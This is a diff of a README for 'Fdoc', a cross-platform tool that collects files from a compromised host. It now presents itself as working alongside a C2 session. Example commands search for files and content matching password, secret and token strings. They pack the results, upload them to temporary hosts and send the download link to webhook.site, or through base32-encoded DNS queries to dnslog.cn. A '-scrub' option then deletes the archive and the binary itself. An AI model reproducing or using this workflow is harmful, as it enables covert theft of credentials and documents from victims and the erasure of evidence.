@@ -1,117 +1,191 @@
 # Fdoc
-信息收集工具 对目标机器上的文档进行收集并打包
 
-## 特色功能
+File collection utility: filter files on a host and pack them into `tar.gz`.
 
-- 打包目录里如有链接文件，会将链接的文件一起打包
-- 可限定大小，当文件大于该值则不进行打包操作
+Optional `-upload` embeds the companion `uploader` tool (auto backend selection + webhook/DNS callback) so the download link can be recovered even if the parent C2 session dies. Without `-upload`, packing stays local and does not open network connections.
 
-## TODO
+Static binaries for Linux, Windows, and macOS.
 
--[x] 增加只对指定目录压缩的功能 -d 就是指定目录；-f就是指定文件；-k就是文件内容；-e就是后缀
--[x] 增加模式选项：1、指定目录压缩；2、后缀压缩；3、近似文件名压缩；4、近似内容
--[x] 文件多时，会栈溢出，需要边爬取文件边进行打包
+## Features
 
-## 使用说明
+- Filter by extension / filename / content keyword / modification date
+- Filters combine with **AND**; values inside `-e` / `-f` / `-k` use **OR**
+- Default `-e documents` (safer than matching every file)
+- Cap total matched logical size (`-max`, default 1GB) with **best-effort** packing
+- Skip oversized single files (`-max-file`, default 100MB; `0` disables)
+- Skip noisy directories by default (OS-specific); override with `-x`
+- Stream while walking (no collect-then-compress memory spike)
+- `-size` measures only (disk + logical) and respects `-max` / `-max-file`
+- `-q` quiet / `-v` verbose
+- `-upload`: auto-select temp host by archive size, then callback
+- `-webhook` / `-dns`: HTTPS JSON callback with DNSLog failover
+- `-scrub`: after successful upload+callback, delete archive and self binary
 
-### 基本用法
+> Symlinks are skipped to avoid cycles and permission issues.
 
-```shell
-Usage of Fdoc:
-  -d string
-        root path to query (global option) (default UserHome)
-  -e string
-        query files by extension,eg. '-e pdf,doc,zip'
-  -f string
-        query files by filename (only for QueryByFileName),eg. '-f config  -f config,password,secret'
-  -k string
-        query files in content by keyword (only for QueryByKeyword),eg. '-k config -k password:,secret:,token:'
-  -max string
-        max file size can be zip (global option) (default "1GB")
-  -o string
-        zip output path (global option) (default "output.tar.gz")
-  -size
-        Calculate total size
-  -t string
-        only query and pack files after the date,like '2023-10-01' (global option)(default "")
-  -x string
-        paths to skip query (global option) (default for windows C:\\Windows, C:\\Program Files, C:\\Program Files (x86), C:\\inetpub, C:\\Users\\Public)
+## Usage
+
+```text
+  -d string       root path to scan (default: user home)
+  -e string       extension filter (default: documents)
+                  presets: documents, all (common docs+archives+txt; NOT every file),
+                           archives|packages, images, videos, any (no ext filter)
+  -f string       fuzzy filename match, comma-separated (OR); AND with other filters
+  -k string       content keywords, comma-separated (OR); AND with other filters
+                  (skips binary; scans up to 8MB per file)
+  -max string     max total LOGICAL size of matched files (default 1GB);
+                  packing stops at the limit and KEEPS the partial archive (exit 2)
+  -max-file string
+                  skip a single file larger than this logical size (default 100MB; 0=off)
+  -o string       output path (default output_<timestamp>.tar.gz)
+  -size           measure matched size only; does not pack; respects -max/-max-file
+  -t string       only files modified on/after this local date, e.g. 2023-10-01
+  -x string       comma-separated directories to skip (replaces defaults if set)
+  -q              quiet mode
+  -v              verbose mode (print matched paths)
+
+  -upload         after packing, upload archive and callback (requires -webhook and/or -dns)
+  -b string       pin upload backend (default: auto probe+failover by archive size)
+  -force          allow flaky/down upload backends
+  -webhook string HTTPS URL that accepts POST JSON (download url + metadata)
+  -dns string     DNSLog / callback base domain (failover if webhook fails)
+  -task-id string task id in callback (auto-generated if empty)
+  -cb-timeout float
+                  webhook timeout seconds (default 15)
+  -scrub          after successful upload+callback, delete archive and self binary
+  -encrypt        encrypt stream before upload (requires -key)
+  -key string     encryption key for -encrypt (not the same as -k keyword)
 ```
 
-### 文件后缀查询
+### Upload + callback
 
-```shell
-"" = 无限制
-all = "pdf,docx,doc,xlsx,xls,csv,pptx,ppt,zip,rar,7z,tar,gz,tgz,bak,bz2,txt";
-documents = "pdf,docx,doc,xlsx,xls,csv,pptx,ppt";
-packages = "zip,rar,7z,tar,gz,tgz,bak,bz2";
-images = "jpg,jpeg,png,gif,bmp";
-videos = "mp4,mkv,avi,mov";
+Flow: pack → auto upload by real archive size → HTTPS webhook → DNS failover → optional `-scrub`.
+
+`-webhook` example values:
+
+- `https://webhook.site/<uuid>` (quick test)
+- `https://your-vps.example.com/fdoc/hook` (your receiver)
+
+`-dns` example values:
+
+- `xxx.dnslog.cn` / `yyy.ceye.io` / self-hosted `cb.example.com`
+
+Webhook body (`Content-Type: application/json`):
+
+```json
+{
+  "task_id": "op42",
+  "host": "HOSTNAME",
+  "url": "https://temp.sh/....",
+  "backend": "temp",
+  "archive": "/tmp/x.tar.gz",
+  "size": 1234567,
+  "files": 42,
+  "truncated": false,
+  "ts": 1710000000
+}
 ```
 
-### 示例
+DNS failover queries (best-effort):
 
-#### 打包指定目录下所有文件（默认）
-
-```shell
-# 默认打包用户家目录(windows: C:\Users\YourUsername, Linux: /home/YourUsername)
-# 默认打包所有文件，大小限制为1GB，输出文件为output_<timestamp>.tar.gz
-# 默认跳过系统目录(Windows: C:\Windows, C:\Program Files, C:\Program Files (x86), C:\inetpub, C:\Users\Public)
-Fdoc
+```text
+<seq>-<total>-<base32chunk>.<task_id>.<dns-base>
 ```
 
-#### 打包指定目录下所有文件
+Payload decoded from base32 chunks is `task_id|host|url`.
+
+`-scrub` only runs when upload **and** at least one callback channel succeed. Omit `-scrub` to keep the archive and binary.
+
+On Unix, `-upload` ignores `SIGHUP` so a dead parent session is less likely to kill the process mid-flight.
+
+### Filter logic
+
+| Expression | Meaning |
+|------------|---------|
+| `-e pdf -f secret` | pdf **and** filename contains secret |
+| `-k password:,token:` | content contains password: **or** token: |
+| `-e any` | no extension restriction (still AND with `-f`/`-k`/`-t` if set) |
+| `-e all` | common docs + archives + txt only — **not** “all files on disk” |
+
+### Extension presets
+
+| Preset | Includes |
+|--------|----------|
+| `documents` (default) | pdf/doc/xls/ppt/csv |
+| `all` | common docs + archives + txt |
+| `archives` / `packages` | zip/rar/7z/tar/gz |
+| `images` | jpg/png/gif/bmp |
+| `videos` | mp4/mkv/avi/mov |
+| `any` | no extension filter |
+
+### Size semantics
+
+| Flag | Uses | Behavior |
+|------|------|----------|
+| `-size` | disk + logical | Report both; stop early if `-max` would be exceeded |
+| `-max` | **logical** cumulative | Archive write budget; truncate keep partial |
+| `-max-file` | **logical** per file | Skip file and continue |
+
+Exit codes: `0` ok, `1` error (including invalid `-max`/`-t` / upload/callback failure), `2` truncated at `-max` (still may upload when `-upload` is set).
+
+### Examples
 
 ```shell
-Fdoc -d C:\test -max 10GB -o output.zip
+# 1) Probe size, then pack
+Fdoc -d /data/docs -e documents -size
+Fdoc -d /data/docs -e documents -max 500MB -o docs.tar.gz
+
+# 2) Default home documents, quiet
+Fdoc -q -o docs.tar.gz
+
+# 3) Filename / keyword hits
+Fdoc -d /data -f password,secret -e any -o hits.tar.gz
+Fdoc -d /data -e txt,ini,conf -k token:,password: -o hits.tar.gz
+
+# 4) Recent files
+Fdoc -d /data -e documents -t 2024-01-01 -o recent.tar.gz
+
+# 5) Broader types / no extension filter
+Fdoc -e all -size
+Fdoc -e any -f config -max-file 0 -o cfg.tar.gz
+
+# 6) Pack → auto upload → callback → scrub
+Fdoc -d /data -e documents -o /tmp/x.tar.gz -upload \
+  -webhook https://webhook.site/<uuid> \
+  -dns xxx.dnslog.cn \
+  -task-id op42 -scrub -q
 ```
 
-#### 打包指定目录下所有指定后缀的文件
+Run `Fdoc -h` for the same recipes inline with flag details.
+
+## Build
+
+`uploader` is embedded via `replace uploader => ./third_party/uploader` (see `go.mod`). To hack against a live checkout, point `replace` at that path and re-run `go mod tidy`.
 
 ```shell
-Fdoc -d C:\test -max 10GB -o output.zip -e all #打包C:\test文件夹下所有符合以上后缀的文件
-Fdoc -d C:\test -max 10GB -o output.zip -e pdf #打包C:\test文件夹下所有pdf后缀的文件
+go mod tidy
+CGO_ENABLED=0 go build -trimpath -ldflags='-s -w' -o Fdoc .
+
+make setup build-linux build-windows build-osx
+
+go test ./...
 ```
 
-#### 获取符合条件的文件的总大小
+## Layout
 
-```shell
-Fdoc -d C:\test -size
+```text
+main.go              entrypoint
+option/              CLI flags
+pkg/                 walk / filter / pack / sighup
+pkg/compress/        tar.gz writer
+pkg/upload/          uploader route wrapper
+pkg/callback/        webhook + DNS callback
+pkg/scrub/           optional artifact cleanup
+third_party/uploader embedded uploader module (replace target)
+logx/                lightweight logging
+utils/               helpers
 ```
 
-#### 通过文件名进行近似查询
+## License
 
-```shell
-Fdoc -d C:\ -max 10GB -o output.zip -f password,secret,config
-```
-
-#### 通过关键字进行查询（查询文件内容）
-
-```shell
-Fdoc -d C:\ -max 10GB -o output.zip -k password:,secret:,token:
-```
-
-## 开发指南
-
-```shell
-go build -o Fdoc main.go
-```
-
-### 目录结构
-
-main.go：程序入口
-option/：命令行参数解析和日志配置
-pkg/：核心功能实现，包括文件遍历和压缩
-utils/：工具函数
-
-## 贡献
-
-欢迎提交 Issue 和 Pull Request，贡献代码请遵循以下规范：
-
-- 提交前请确保代码通过所有测试
-- 提交前请确保代码格式化正确
-
-## 许可证
-
-本项目使用 MIT 许可证，详情请参见 LICENSE 文件。
-
+MIT (see LICENSE).
